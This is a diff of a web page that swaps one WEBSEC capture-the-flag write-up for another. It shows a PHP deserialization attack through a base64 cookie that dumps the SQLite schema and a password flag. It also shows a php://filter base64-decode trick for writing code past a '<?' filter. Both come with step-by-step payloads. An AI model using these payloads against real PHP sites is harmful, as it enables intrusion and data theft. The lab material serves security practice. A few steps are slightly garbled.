@@ -76,38 +76,45 @@
         
   <section class="container centered">
   <div class="error">
-   <h1 id="websec-level-4">WEBSEC Level 4</h1><br><br>
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   <h1 id="websec-level-24">WEBSEC Level 24</h1>
 <h3 id="challenge-description">Challenge description</h3>
-<p>Serialization is a pain!</p><br>
+<p>Secure text storage</p>
 <h3 id="initial-analysis">Initial analysis</h3>
-<p><code>$sql->query = 'SELECT username FROM users WHERE id=';  //query
-
-
-if (isset ($_COOKIE['leet_hax0r'])) {
-    $sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));   //deserialization vuln
-else  $cookie = base64_encode (serialize (array ( 'ip' => $_SERVER['REMOTE_ADDR']))) ;
-
-class SQL {
-    public $query = '';
-    public $conn;
-    public function __construct() {      //class
-    }</code></p><br>
-<h3 id="tldr">tl;dr</h3>
-<p>STEP 1: <?php class SQL { public $query = `'SELECT sql as username FROM sqlite_master'`; }
-
-$a = new SQL(); echo serialize($a); echo base64_encode(serialize($a)); ?></p>
-<p>=&gt; O:3:&quot;SQL&quot;:1:{s:5:&quot;query&quot;;s:41:&quot;SELECT sql as username FROM sqlite_master&quot;;} =&gt; TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6NDE6IlNFTEVDVCBzcWwgYXMgdXNlcm5hbWUgRlJPTSBzcWxpdGVfbWFzdGVyIjt9</p>
-<p>STEP 2: Assign Cookie value= <code>TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6NDE6IlNFTEVDVCBzcWwgYXMgdXNlcm5hbWUgRlJPTSBzcWxpdGVfbWFzdGVyIjt9</code></p><p> OUTPUT: Username: CREATE TABLE users(id int, username varchar, password varchar)</p>
-<p>STEP 3: <?php class SQL { public $query = `'SELECT password as username FROM sqlite_master'`; }
-
-$a = new SQL(); echo serialize($a); echo base64_encode(serialize($a)); ?></p>
-<p>=&gt; O:3:&quot;SQL&quot;:1:{s:5:&quot;query&quot;;s:38:&quot;SELECT password as username FROM users&quot;;} =&gt; TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6Mzg6IlNFTEVDVCBwYXNzd29yZCBhcyB1c2VybmFtZSBGUk9NIHVzZXJzIjt9</p>
-<p>STEP 2: Assign Cookie value= <code>TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6Mzg6IlNFTEVDVCBwYXNzd29yZCBhcyB1c2VybmFtZSBGUk9NIHVzZXJzIjt9</code></p>
-<p></p><p>OUTPUT: Username: WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}</p><br>
-<h3 id="flag">Flag</h3>
-<p><strong>FLAG</strong>: <code>WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}</code></p>
+<p><code>if (isset($_GET['p']) &amp;&amp; isset($_GET['filename']) ) {     $filename = $_GET['filename'];     if ($_GET['p'] === &quot;edit&quot;) {         $p = &quot;edit&quot;;         if (isset($_POST['data'])) {             $data = $_POST['data'];             if (strpos($data, '&lt;?')  === false &amp;&amp; stripos($data, 'script')  === false) {  # no interpretable code please.                 file_put_contents($_GET['filename'], $data);                 die ('&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=.&quot;&gt;');             }         } elseif (file_exists($_GET['filename'])){             $data = file_get_contents($_GET['filename']);         }     } }</code></p>
+<h3 id="walk-through">Walk through</h3>
+<p>OVERVIEW: Payload: qwerty.php Index of ./uploads/vg4tgcn2q0ghcqr1r2vmlah1m0osm1u4/: qwerty.php, which on clicking gives an option to edit the contents</p>
+<p>In Local File Inclusion,for Reading arbitrary files: php filters can be used index.php?file=php://filter/convert.base64-encode/resource=config.php OR index.php?file=php://filter/convert.base64-decode/resource=config.php</p>
+<p>STEP 1: File Name= php://filter/convert.base64-decode/resource=flag.php</p>
+<p>STEP 2: .encode('base64') OUTPUT: PD9waHAgc2hvd19zb3VyY2UoJy9mbGFnLnBocCcpOz8+</p>
+<p>STEP 3: Payload in flag.php: PD9waHAgc2hvd19zb3VyY2UoJy9mbGFnLnBocCcpOz8+ Save changes</p>
+<p>STEP 4: Go to http://websec.fr/level24/uploads/nj2o7biqk0m290nq4bunuue3fsijii96/flag.php</p>
+<p>STEP 5: Use Ctrl+Shift+I(Inspect tool)</p>
+<p>REFERENCE: https://github.com/qazbnm456/awesome-security-trivia/blob/master/Tricky-ways-to-exploit-PHP-Local-File-Inclusion.md</p>
 <p>For further queries, please DM me on Twitter: <a href="https://twitter.com/m0n574">https://twitter.com/m0n574</a>.</p>
-
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
 
   </div>
 </section>
